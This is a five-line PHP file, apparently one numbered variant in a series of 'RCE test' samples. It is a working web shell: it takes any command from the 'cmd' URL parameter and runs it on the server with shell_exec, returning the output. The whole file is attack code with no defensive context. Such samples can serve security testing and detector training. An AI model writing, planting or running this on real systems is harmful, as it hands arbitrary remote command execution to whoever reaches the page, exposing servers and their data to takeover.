<?php
// RCE test variation #925
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>